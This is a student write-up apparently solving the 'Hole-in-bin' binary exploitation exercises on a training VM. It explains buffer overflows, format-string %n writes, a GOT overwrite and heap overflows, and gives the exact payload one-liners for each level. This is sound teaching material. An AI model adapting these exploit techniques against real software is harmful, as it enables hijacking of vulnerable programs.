# Hole-in-bin

This exercise is designed to test your skills and understanding of binary exploitation and reverse engineering. You will need to work through a series of binary exploitation challenges using a provided virtual machine.

### [Audit questions](https://github.com/01-edu/public/tree/master/subjects/cybersecurity/hole-in-bin/audit)
#### [Task description](https://github.com/01-edu/public/tree/master/subjects/cybersecurity/hole-in-bin)
#### [Virtual machine download](https://assets.01-edu.org/cybersecurity/hole-in-bin/hole-in-bin.ova)
## ex00

First we need to get the specifics of the main function. I will do it in every following exercise.
We can do it like this:     
```bash
# Assuming you're in the exercise folder
gdb ./bin     
disas main
```    
<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/00_main2.png" width="400" heigth="400" />   

As we can see the application uses `gets()` function. It can be exploited, because `gets()` doesn't check for buffer overflows.   

We can calculate the buffer size by subtracting (%eax) buffer offset address from end address of the buffer `0x5c - 0x1c = 0x40`    
So our input needs to be longer than 0x40 (64 in decimal) characters.         

![pic1](https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/00_done.png)  

## ex01 

<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/01_done.png" width="1000" heigth="800" />  

The program compares input/argument to 0x61626364 (`abcd` based on ascii table from hex value).     
It expects the input string to be in little-endian format, meaning that the least significant byte is stored first in memory.   
This time end of the buffer address is `0x60` and start `0x1c` so the argument needs to be `0x44` (68 decimals) long.   

As the least significant byte is stored first, we need to write out `abcd` in reverse: `0000000000000000000000000000000000000000000000000000000000000000dcba`

## ex02

<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/02_done.png" width="1000" heigth="800" />     

This was pretty much copy-paste from the previous exercise.     
Only in this one you had to give a correct value to a variable before running the application.  

Hex value you need to give to your variable in order to pass the comparison:    
`d0a0d0a` which translates to `\r\n\r\n`.  
Because the task expects little-endian format again, we need to reverse the variable:   
`GREENIE=$'0000000000000000000000000000000000000000000000000000000000000000\n\r\n\r'`

## ex03

This exercise was a bit different. There was a hidden `win()` function that you needed to access.   
This is how I did it:   
<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/03_done.png" width="1000" heigth="800"/> 

- Search info about all functions in the application, using `info functions` in `gdb` env.
- Then disassamble the `win()` function to get the correct address.
- Format little-endian string with the correct function address. 
    - I used this command: `echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x24\x84\x04\x08' | ./bin`

## ex04

This was pretty much the same as previous exercise. Only the buffer size was bigger.    
The return address of the function overwrites the offset value as: `0x50 + 8 + 4 - 0x10 = 0x4C = dec(76)`  
<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/04_done.png"/>
- Command used: `python -c "print 'A'*76+'\xf4\x83\x04\x08'" | ./bin`

## ex05 

We can exploit sprintf formating to overflow the buffer.    
Create a format string that writes 64 characters followed by `deadbeef`, which results in target being overwritten.

Command: `./bin $(python -c "print 'A'*64+'\xef\xbe\xad\xde'")`

<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/05_done.png"/>

## ex06

This one was different and a little bit harder than the previous ones. A lot of information online about the task, but for whatever reason the heap start address always changes here. Therefor we had to come up with another solution to the exercise.

We start by finding the address of winner function using: 
- `objdump -t bin | grep winner` 

Disassemble the main function in our bin file using `gdb` and place a breakpoint before `puts()` call using: 
- `break puts`

Run the program with our breakpoint using 
- `run a a a`.   

Then jump to `winner()` using the function address:
-  `jump *0x08048864`

#### Solution:
<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/06_done.png"/>

## ex07

Start by identify the vulnerability in gdb env: `disas vuln`. 
We see that the function uses `printf()` before a variable comparison.   
So we can now search for the address of the variable and perform a string attack to modify it.  
First we try to display variable address using the format string `%x`.    
When the address is displayed properly. Instead of reading by using `%x`, lets write with a `%n`.   
With trial and error I got to the final result.

#### Solution:
<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/07_done.png"/>

## ex08

We do the same stuff we did on the previous task. Buffer size is bigger and also the target value is in hex (`0x080484a2 <+59>:	cmp    $0x1025544,%eax`).

<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/08_info.png"/>   

After getting this information I converted the hex value to decimal and got close enough to the needed value and did a small trial by error. 

#### Solution: 
`python -c "print '\xf4\x96\x04\x08' + '%x'*10 + '%16930052x' + '%n'" | ./bin`  

Sadly solution breaks the terminal, so I couldn't include it in the previous pictures:    
<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/08_done.png"/>   

## ex09 

Our goal is to redirect execution to the hello() function. We start by taking a look at the disassembly of the vuln() function.     
We are going to redirect the execution flow by overwriting the entry for the exit() function.
After finding the addresses of `hello()` and `exit()`, we need to get the print value of `hello()`.     
Then we need to overwrite last to bytes of the exit address using this command: `python -c 'print "\x24\x97\x04\x08"+"%33968x%4$hn"' | ./bin`

<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/09_info.png"/>

### Solution:
<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/09_done.png">    

This solution has terminal spam again but I used the same commands.

## ex10 

We start out by making a breakpoint at the end of main function to see heap memory in gdb.   
Then run the program with `AAAA` argument.
After following instructions on the picture, you can see where the `AAAA` (0x41414141) input is stored at   
and where the `nowinner()` function starts from. We can calculate total bytes needed to fill based on that map.     
My map had `72` bytes between start and end so final command to pass the exercise is:   
`./bin $(python -c "print 'A'*72 + '\x64\x84\x04\x08'")`    
<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/10_info.png" width="1000" heigth="1000">   
<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/10_done.png">   

## ex11 

In this program, we see that that two internet structs have been allocated.     
Each struct contains a name pointer that is separately allocated.   
This means that the internet struct allocated on the heap will contain a pointer to another part of the memory on the heap that contains the char buffer.   

To overwrite the 0x0804a038 pointer, we see that we need to write 20 bytes followed by the memory address where we want the second strcpy call to write to.

To successfully redirect control flow to the winner() function we have to start from an address near 0xbffff77c and write \x94\x84\x04\x08 repeatedly.  
This will eventually overwrite the return address of main().

I used same principles here to get information as in the previous task.
#### Solution:
`./bin $(python -c "print 'A'*20 + '\x74\x97\x04\x08'") $(python -c "print '\x94\x84\x04\x08'")`

##
### Author: [Juss](https://01.kood.tech/git/juss)